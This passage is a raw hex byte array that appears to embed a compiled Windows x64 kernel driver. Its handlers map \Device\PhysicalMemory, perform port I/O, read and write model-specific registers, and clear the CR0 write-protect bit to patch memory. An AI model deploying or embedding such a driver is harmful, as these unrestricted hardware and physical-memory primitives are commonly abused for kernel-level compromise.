  0x0c, 0x00, 0x74, 0x0e, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x0c, 0xc7, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x20, 0x89, 0x44, 0x24, 0x00, 0xc7, 0x44,
  0x24, 0x10, 0x00, 0x00, 0x02, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x00, 0x89,
  0x44, 0x24, 0x0c, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x00, 0x89, 0x44, 0x24,
  0x08, 0x8b, 0x44, 0x24, 0x0c, 0x25, 0x00, 0x10, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x0a, 0xb8, 0x01,
  0x00, 0x00, 0xc0, 0xe9, 0xd6, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04,
  0x8b, 0x4c, 0x24, 0x10, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24,
  0x00, 0x89, 0x08, 0x8b, 0x44, 0x24, 0x00, 0x83, 0xe0, 0xdf, 0x89, 0x44, 0x24, 0x00, 0x48, 0x8b,
  0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24, 0x00, 0x89, 0x08, 0xc7, 0x44, 0x24, 0x10, 0x11,
  0x00, 0x02, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24, 0x10, 0x89,
  0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x10, 0x25, 0xfe, 0x00, 0x00, 0x00, 0x48, 0x8b,
  0x4c, 0x24, 0x30, 0x8b, 0x49, 0x08, 0x88, 0x01, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x08,
  0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8a, 0x49, 0x14, 0x88, 0x08, 0x8b, 0x44, 0x24, 0x00, 0x0d, 0x00,
  0x10, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8b, 0x09, 0x89, 0x01, 0x48, 0x8b, 0x44, 0x24,
  0x30, 0x8b, 0x00, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x44, 0x24, 0x14, 0x25, 0x00, 0x10,
  0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, 0x8b, 0x44, 0x24, 0x14, 0x83, 0xe0, 0x01, 0x85, 0xc0, 0x75,
  0x25, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x89, 0x08, 0x48, 0x8b,
  0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24, 0x08, 0x89, 0x08, 0xb8, 0x01, 0x00, 0x00,
  0xc0, 0xe9, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x1c, 0x83, 0xe0,
  0x0f, 0x83, 0xc8, 0x10, 0x0d, 0x00, 0x00, 0x02, 0x00, 0x0d, 0x00, 0x00, 0x00, 0xff, 0x89, 0x44,
  0x24, 0x10, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24, 0x10, 0x89, 0x08,
  0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x10, 0x83, 0xc8, 0x01, 0x48, 0x8b, 0x4c, 0x24, 0x30,
  0x8b, 0x49, 0x08, 0x88, 0x01, 0x8b, 0x44, 0x24, 0x00, 0x0d, 0x00, 0x06, 0x00, 0x00, 0x89, 0x44,
  0x24, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24, 0x00, 0x89, 0x08, 0x8b,
  0x44, 0x24, 0x00, 0x0d, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8b, 0x09, 0x89,
  0x01, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x44,
  0x24, 0x14, 0x25, 0x00, 0x10, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, 0x8b, 0x44, 0x24, 0x14, 0x83,
  0xe0, 0x01, 0x85, 0xc0, 0x75, 0x07, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xeb, 0x71, 0xc7, 0x44, 0x24,
  0x04, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x0b, 0x8b, 0x44, 0x24, 0x04, 0x83, 0xc0, 0x01, 0x89, 0x44,
  0x24, 0x04, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x1c, 0x39, 0x44, 0x24, 0x04, 0x73, 0x31,
  0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x08, 0x0f, 0xb6, 0x00, 0x25, 0xff, 0x00, 0x00, 0x00,
  0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8b, 0x49, 0x18, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x8b, 0x52, 0x1c,
  0x44, 0x8b, 0x44, 0x24, 0x04, 0x42, 0x8d, 0x54, 0x02, 0xff, 0x8b, 0xd2, 0x88, 0x04, 0x11, 0xeb,
  0xb6, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24, 0x0c, 0x89, 0x08, 0x48, 0x8b,
  0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24, 0x08, 0x89, 0x08, 0x33, 0xc0, 0x48, 0x83,
  0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
  0x48, 0x89, 0x4c, 0x24, 0x08, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x83, 0x78,
  0x0c, 0x00, 0x74, 0x0e, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x0c, 0xc7, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x20, 0x89, 0x44, 0x24, 0x00, 0xc7, 0x44,
  0x24, 0x10, 0x00, 0x00, 0x02, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x00, 0x89,
  0x44, 0x24, 0x0c, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x00, 0x89, 0x44, 0x24,
  0x08, 0x8b, 0x44, 0x24, 0x0c, 0x25, 0x00, 0x10, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x0a, 0xb8, 0x01,
  0x00, 0x00, 0xc0, 0xe9, 0x3d, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04,
  0x8b, 0x4c, 0x24, 0x10, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24,
  0x00, 0x89, 0x08, 0x8b, 0x44, 0x24, 0x00, 0x83, 0xe0, 0xdf, 0x89, 0x44, 0x24, 0x00, 0x48, 0x8b,
  0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24, 0x00, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30,
  0x8b, 0x40, 0x1c, 0x83, 0xc0, 0x01, 0x83, 0xe0, 0x0f, 0x83, 0xc8, 0x10, 0x0d, 0x00, 0x00, 0x02,
  0x00, 0x0d, 0x00, 0x00, 0x00, 0xff, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b,
  0x40, 0x04, 0x8b, 0x4c, 0x24, 0x10, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x10,
  0x25, 0xfe, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8b, 0x49, 0x08, 0x88, 0x01, 0x48,
  0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x08, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8a, 0x49, 0x14, 0x88,
  0x08, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x0b, 0x8b, 0x44, 0x24, 0x04, 0x83,
  0xc0, 0x01, 0x89, 0x44, 0x24, 0x04, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x1c, 0x39, 0x44,
  0x24, 0x04, 0x73, 0x1b, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x18, 0x8b, 0x4c, 0x24, 0x04,
  0x48, 0x8b, 0x54, 0x24, 0x30, 0x8b, 0x52, 0x08, 0x8a, 0x04, 0x08, 0x88, 0x02, 0xeb, 0xcc, 0x8b,
  0x44, 0x24, 0x00, 0x0d, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x8b, 0x09, 0x89,
  0x01, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x00, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x44,
  0x24, 0x14, 0x25, 0x00, 0x10, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, 0x8b, 0x44, 0x24, 0x14, 0x83,
  0xe0, 0x01, 0x85, 0xc0, 0x75, 0x22, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b, 0x4c, 0x24,
  0x0c, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24, 0x08, 0x89,
  0x08, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0xeb, 0x1d, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x00, 0x8b,
  0x4c, 0x24, 0x0c, 0x89, 0x08, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0x40, 0x04, 0x8b, 0x4c, 0x24,
  0x08, 0x89, 0x08, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
  0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0xf1, 0x1b, 0x00, 0x00, 0x48,
  0x8d, 0x4c, 0x24, 0x20, 0xff, 0x15, 0xf6, 0x0b, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xff,
  0x15, 0x13, 0x0c, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0xff, 0x15, 0x41, 0x0c, 0x00, 0x00, 0x48,
  0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
  0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x48, 0x81, 0xec, 0xd0, 0x00, 0x00, 0x00, 0x48, 0x8b,
  0xfa, 0x45, 0x33, 0xe4, 0x4c, 0x89, 0x64, 0x24, 0x50, 0x4c, 0x89, 0xa4, 0x24, 0x88, 0x00, 0x00,
  0x00, 0x41, 0x83, 0xf8, 0x10, 0x0f, 0x82, 0xf4, 0x01, 0x00, 0x00, 0x41, 0x83, 0xf9, 0x08, 0x0f,
  0x82, 0xea, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x1f, 0x44, 0x89, 0x64, 0x24, 0x70, 0x44, 0x89, 0x64,
  0x24, 0x74, 0x8b, 0x77, 0x08, 0x48, 0x8d, 0x15, 0xf4, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x8c, 0x24,
  0xc0, 0x00, 0x00, 0x00, 0xff, 0x15, 0x76, 0x0b, 0x00, 0x00, 0xc7, 0x84, 0x24, 0x90, 0x00, 0x00,
  0x00, 0x30, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xa4, 0x24, 0x98, 0x00, 0x00, 0x00, 0xc7, 0x84, 0x24,
  0xa8, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x84, 0x24, 0xc0, 0x00, 0x00, 0x00,
  0x48, 0x89, 0x84, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xa4, 0x24, 0xb0, 0x00, 0x00, 0x00,
  0x4c, 0x89, 0xa4, 0x24, 0xb8, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00,
  0x41, 0xbd, 0x1f, 0x00, 0x0f, 0x00, 0x41, 0x8b, 0xd5, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0xff, 0x15,
  0x3c, 0x0b, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x8c, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x89, 0x64, 0x24,
  0x28, 0x48, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x32,
  0xc9, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xff, 0x15, 0x06, 0x0b,
  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x8c, 0x3a, 0x01, 0x00, 0x00, 0x8b, 0xc6, 0x48, 0x03, 0xc3, 0x48,
  0x89, 0x44, 0x24, 0x60, 0x48, 0x8d, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d,
  0x4c, 0x24, 0x74, 0x4c, 0x8b, 0xc3, 0x33, 0xd2, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0xce, 0xff,
  0x15, 0xab, 0x0a, 0x00, 0x00, 0x0f, 0xb6, 0xd8, 0x48, 0x8d, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44,
  0x24, 0x20, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x4c, 0x8b, 0x44, 0x24, 0x60, 0x33, 0xd2, 0x8b, 0xce,
  0xff, 0x15, 0x8a, 0x0a, 0x00, 0x00, 0x84, 0xdb, 0x74, 0x1a, 0x84, 0xc0, 0x74, 0x16, 0x48, 0x8b,
  0x4c, 0x24, 0x60, 0x48, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x2b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x58,
  0x85, 0xc9, 0x75, 0x14, 0xb8, 0x01, 0x00, 0x00, 0xc0, 0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00,
  0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4c, 0x89, 0x64,
  0x24, 0x68, 0x8b, 0xc1, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x48,
  0x04, 0x02, 0x00, 0x00, 0x44, 0x89, 0x64, 0x24, 0x40, 0x89, 0x74, 0x24, 0x38, 0x48, 0x8d, 0x8c,
  0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48,
  0x89, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x33, 0xc9, 0x4c, 0x8d, 0x44, 0x24,
  0x68, 0x48, 0xba, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x50,
  0xff, 0x15, 0x1a, 0x0a, 0x00, 0x00, 0x8b, 0xd8, 0x85, 0xdb, 0x7d, 0x1c, 0x48, 0x8b, 0x4c, 0x24,
  0x50, 0xff, 0x15, 0x01, 0x0a, 0x00, 0x00, 0x8b, 0xc3, 0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00,
  0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0x8b, 0x44, 0x24, 0x58, 0x8b, 0x4c, 0x24, 0x78,
  0x48, 0x2b, 0xc8, 0x48, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x03, 0xc1, 0x48, 0x89, 0x44, 0x24, 0x68,
  0x48, 0x89, 0x07, 0x48, 0x8b, 0x4c, 0x24, 0x50, 0xff, 0x15, 0xca, 0x09, 0x00, 0x00, 0x33, 0xc0,
  0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xb8,
  0x9a, 0x00, 0x00, 0xc0, 0x48, 0x81, 0xc4, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x5d, 0x41, 0x5c, 0x5f,
  0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
  0x5c, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5c, 0x00,
  0x50, 0x00, 0x68, 0x00, 0x79, 0x00, 0x73, 0x00, 0x69, 0x00, 0x63, 0x00, 0x61, 0x00, 0x6c, 0x00,
  0x4d, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x6f, 0x00, 0x72, 0x00, 0x79, 0x00, 0x00, 0x00, 0xcc, 0xcc,
  0x48, 0x89, 0x54, 0x24, 0x10, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
  0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xfa, 0x45, 0x33, 0xe4, 0x44, 0x89, 0x67, 0x30, 0x4c, 0x89,
  0x67, 0x38, 0x48, 0x8b, 0x87, 0xb8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x5f, 0x18, 0x8b, 0x50, 0x10,
  0x44, 0x8b, 0x48, 0x08, 0x80, 0x38, 0x0e, 0x0f, 0x85, 0xd7, 0x03, 0x00, 0x00, 0x8b, 0x40, 0x18,
  0x05, 0x00, 0xe0, 0xff, 0x7f, 0x83, 0xf8, 0x3c, 0x0f, 0x87, 0xbf, 0x03, 0x00, 0x00, 0x4c, 0x8d,
  0x05, 0x1f, 0x04, 0x00, 0x00, 0x49, 0x0f, 0xb6, 0x04, 0x00, 0x4c, 0x8d, 0x05, 0xd3, 0x03, 0x00,
  0x00, 0x49, 0x63, 0x04, 0x80, 0x4c, 0x8d, 0x05, 0x05, 0x00, 0x00, 0x00, 0x49, 0x03, 0xc0, 0xff,
  0xe0, 0x44, 0x8b, 0xc2, 0x48, 0x8b, 0xd3, 0xe8, 0x14, 0xfd, 0xff, 0xff, 0x89, 0x47, 0x30, 0x85,
  0xc0, 0x7c, 0x0d, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x84, 0x03, 0x00, 0x00,
  0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x78, 0x03, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x72,
  0x1b, 0x48, 0x8b, 0x13, 0x48, 0xb9, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x15,
  0xec, 0x08, 0x00, 0x00, 0x89, 0x47, 0x30, 0xe9, 0x58, 0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x01,
  0x00, 0x00, 0xc0, 0xe9, 0x4c, 0x03, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x1b, 0x66, 0x8b, 0x13,
  0xec, 0x0f, 0xbe, 0xc0, 0x89, 0x43, 0x04, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x08,
  0x00, 0x00, 0x00, 0xe9, 0x2c, 0x03, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9,
  0x20, 0x03, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x1c, 0x66, 0x8b, 0x13, 0x66, 0xed, 0x0f, 0xb7,
  0xc0, 0x89, 0x43, 0x04, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00,
  0xe9, 0xff, 0x02, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xf3, 0x02, 0x00,
  0x00, 0x83, 0xfa, 0x08, 0x75, 0x18, 0x66, 0x8b, 0x13, 0xed, 0x89, 0x43, 0x04, 0x44, 0x89, 0x67,
  0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0xd6, 0x02, 0x00, 0x00, 0xc7, 0x47,
  0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xca, 0x02, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x18, 0x66,
  0x8b, 0x13, 0x8a, 0x43, 0x04, 0xee, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00,
  0x00, 0x00, 0xe9, 0xad, 0x02, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xa1,
  0x02, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x1a, 0x66, 0x8b, 0x13, 0x66, 0x8b, 0x43, 0x04, 0x66,
  0xef, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x82, 0x02,
  0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x76, 0x02, 0x00, 0x00, 0x83, 0xfa,
  0x08, 0x75, 0x18, 0x66, 0x8b, 0x13, 0x8b, 0x43, 0x04, 0xef, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7,
  0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x59, 0x02, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00,
  0x00, 0xc0, 0xe9, 0x4d, 0x02, 0x00, 0x00, 0x83, 0xfa, 0x14, 0x0f, 0x85, 0xcc, 0x00, 0x00, 0x00,
  0x8b, 0x4b, 0x0c, 0x49, 0x0f, 0x20, 0xc7, 0x49, 0x8b, 0xc7, 0x48, 0x25, 0xff, 0xff, 0xfe, 0xff,
  0x48, 0x0f, 0x22, 0xc0, 0x85, 0xc9, 0x0f, 0x86, 0x99, 0x00, 0x00, 0x00, 0x49, 0x8b, 0xf4, 0x44,
  0x8b, 0xf1, 0x41, 0xbd, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x43, 0x08, 0x85, 0xc0, 0x74, 0x0b, 0x0f,
  0xbe, 0x04, 0x30, 0x3d, 0xff, 0x00, 0x00, 0x00, 0x75, 0x6a, 0x45, 0x8b, 0xe5, 0x8b, 0x43, 0x10,
  0x24, 0x01, 0x74, 0x12, 0x8b, 0x0b, 0x48, 0x03, 0xce, 0xff, 0x15, 0x79, 0x07, 0x00, 0x00, 0x84,
  0xc0, 0x75, 0x03, 0x45, 0x33, 0xe4, 0x8b, 0x43, 0x10, 0x24, 0x02, 0x74, 0x13, 0x8b, 0x4b, 0x04,
  0x48, 0x03, 0xce, 0xff, 0x15, 0x5f, 0x07, 0x00, 0x00, 0x84, 0xc0, 0x75, 0x03, 0x45, 0x33, 0xe4,
  0x45, 0x85, 0xe4, 0x74, 0x20, 0x8b, 0x43, 0x08, 0x85, 0xc0, 0x74, 0x04, 0xc6, 0x04, 0x30, 0x00,
  0x8b, 0x03, 0x85, 0xc0, 0x74, 0x1e, 0x8b, 0x4b, 0x04, 0x85, 0xc9, 0x74, 0x17, 0x8a, 0x04, 0x30,
  0x88, 0x04, 0x31, 0xeb, 0x0f, 0x8b, 0x43, 0x08, 0x85, 0xc0, 0x74, 0x04, 0xc6, 0x04, 0x30, 0xcd,
  0x83, 0x43, 0x0c, 0xff, 0x48, 0x83, 0xc6, 0x01, 0x49, 0x83, 0xee, 0x01, 0x0f, 0x85, 0x76, 0xff,
  0xff, 0xff, 0x45, 0x33, 0xe4, 0x49, 0x0f, 0x22, 0xc7, 0x0f, 0x09, 0x44, 0x89, 0x67, 0x30, 0x48,
  0xc7, 0x47, 0x38, 0x14, 0x00, 0x00, 0x00, 0xe9, 0x78, 0x01, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x9a,
  0x00, 0x00, 0xc0, 0xe9, 0x6c, 0x01, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x21, 0x41, 0xbd, 0x01,
  0x00, 0x00, 0x00, 0x44, 0x89, 0x2b, 0xc7, 0x43, 0x04, 0x05, 0x00, 0x00, 0x00, 0x44, 0x89, 0x67,
  0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x46, 0x01, 0x00, 0x00, 0xc7, 0x47,
  0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0x3a, 0x01, 0x00, 0x00, 0x83, 0xfa, 0x08, 0x75, 0x32, 0x8b,
  0x03, 0x8b, 0x0d, 0xbd, 0x16, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x80, 0x0f, 0x45, 0xc8, 0x89,
  0x0d, 0xaf, 0x16, 0x00, 0x00, 0x03, 0x4b, 0x04, 0x89, 0x0d, 0xa6, 0x16, 0x00, 0x00, 0x89, 0x0b,
  0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xe9, 0x03, 0x01, 0x00,
  0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xf7, 0x00, 0x00, 0x00, 0x83, 0xfa, 0x0c,
  0x75, 0x42, 0x8b, 0x0b, 0x0f, 0x32, 0x8b, 0xca, 0x48, 0xc1, 0xe1, 0x20, 0x48, 0x0b, 0xc8, 0x48,
  0x89, 0x4c, 0x24, 0x20, 0x48, 0xc1, 0xe9, 0x20, 0x89, 0x4b, 0x04, 0x8b, 0x44, 0x24, 0x20, 0x89,
  0x43, 0x08, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x0c, 0x00, 0x00, 0x00, 0xe9, 0xc1,
  0x00, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9,
  0xb0, 0x00, 0x00, 0x00, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xe9, 0xa4, 0x00, 0x00, 0x00,
  0x83, 0xfa, 0x0c, 0x75, 0x2d, 0x8b, 0x43, 0x08, 0x48, 0x8b, 0xd0, 0x48, 0xc1, 0xea, 0x20, 0x8b,
  0x0b, 0x0f, 0x30, 0x44, 0x89, 0x67, 0x30, 0x48, 0xc7, 0x47, 0x38, 0x0c, 0x00, 0x00, 0x00, 0xe9,
  0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0,
  0xeb, 0x72, 0xc7, 0x47, 0x30, 0x0d, 0x00, 0x00, 0xc0, 0xeb, 0x69, 0x83, 0xfa, 0x24, 0x75, 0x23,
  0x48, 0x8b, 0xcb, 0xe8, 0x98, 0xf5, 0xff, 0xff, 0x85, 0xc0, 0x7c, 0x0e, 0x44, 0x89, 0x67, 0x30,
  0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xeb, 0x4a, 0xc7, 0x47, 0x30, 0x01, 0x00, 0x00,
  0xc0, 0xeb, 0x41, 0xc7, 0x47, 0x30, 0x9a, 0x00, 0x00, 0xc0, 0xeb, 0x38, 0x83, 0xfa, 0x24, 0x75,
  0x23, 0x48, 0x8b, 0xcb, 0xe8, 0xb7, 0xf7, 0xff, 0xff, 0x85, 0xc0, 0x7c, 0x0e, 0x44, 0x89, 0x67,
  0x30, 0x48, 0xc7, 0x47, 0x38, 0x08, 0x00, 0x00, 0x00, 0xeb, 0x19, 0xc7, 0x47, 0x30, 0x01, 0x00,
  0x00, 0xc0, 0xeb, 0x10, 0xc7, 0x47, 0x30, 0x9a, 0x00, 0x00, 0xc0, 0xeb, 0x07, 0xc7, 0x47, 0x30,
  0x0d, 0x00, 0x00, 0xc0, 0x8b, 0x5f, 0x30, 0x32, 0xd2, 0x48, 0x8b, 0xcf, 0xff, 0x15, 0x6e, 0x05,
  0x00, 0x00, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c,
  0x5f, 0x5e, 0x5b, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x2b, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00,
